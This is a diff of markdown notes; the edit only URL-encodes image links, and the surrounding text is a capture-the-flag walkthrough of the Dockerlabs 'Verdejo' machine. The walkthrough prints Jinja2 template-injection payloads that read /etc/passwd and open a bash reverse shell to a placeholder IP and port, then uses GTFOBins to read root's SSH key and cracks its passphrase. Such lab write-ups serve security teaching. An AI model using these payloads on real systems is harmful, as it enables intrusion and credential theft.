@@ -1277,16 +1277,16 @@ The .NET `System.Diagnostics.Process.Start` method can be used to start any proc
 We will be using Dockerlabs machine VERDEJO: https://mega.nz/file/ZasAgTpa#czwKDizDR0-eHGyzP8OG1VCj2od-Xzq0DWbFsTVXFWw
 ## Enumeration
 
-![](Pasted image 20240916181317.png)
+![](Pasted%20image%2020240916181317.png)
 Port 80 http service does not have anything interesting within it, but 8089 does, when we go in we find this:
-![](Pasted image 20240916181531.png)
+![](Pasted%20image%2020240916181531.png)
 If we try XSS on that we get this:
-![](Pasted image 20240916181615.png)
-![](Pasted image 20240916181626.png)
+![](Pasted%20image%2020240916181615.png)
+![](Pasted%20image%2020240916181626.png)
 This page is vulnerable to XSS and also to SSTI, we know that by trying following payload:
 `{{5*5}}`
 
-![](Pasted image 20240916181817.png)
+![](Pasted%20image%2020240916181817.png)
 
 ## EXPLOITATION
 
@@ -1294,34 +1294,34 @@ This page is vulnerable to XSS and also to SSTI, we know that by trying followin
 After testing some payloads, we could use this:
 
 `{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('cat /etc/passwd').read() }}`
-![](Pasted image 20240916182013.png)
+![](Pasted%20image%2020240916182013.png)
 
 Lets get a reverse shell:
 `{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"').read() }}`
 
-![](Pasted image 20240916182929.png)
+![](Pasted%20image%2020240916182929.png)
 
 Spawning a stable shell:
 
 [[Shell Tricks]]
 
-![](Pasted image 20240916183201.png)
+![](Pasted%20image%2020240916183201.png)
 Now that we've got a stable shell, lets start privilege escalation
 
 ## Privilege Escalation
 
-![](Pasted image 20240916183323.png)
+![](Pasted%20image%2020240916183323.png)
 
 
 #### GTFOBINS
 
-![](Pasted image 20240916184431.png)
+![](Pasted%20image%2020240916184431.png)
 Lets use this to read id_rsa file from root:
 
-![](Pasted image 20240916184500.png)
+![](Pasted%20image%2020240916184500.png)
 We can pass it to a file and download that file to our local machine:
 
-![](Pasted image 20240916184542.png)
+![](Pasted%20image%2020240916184542.png)
 
 We can decrypt id_rsa passphrase using ssh2john and john
 
@@ -1332,7 +1332,7 @@ When we do it, we get passphrase `honda1`
 
 Entering ssh:
 
-![](Pasted image 20240916185011.png)
+![](Pasted%20image%2020240916185011.png)
 And just like that, we finished this ctf!
 
 
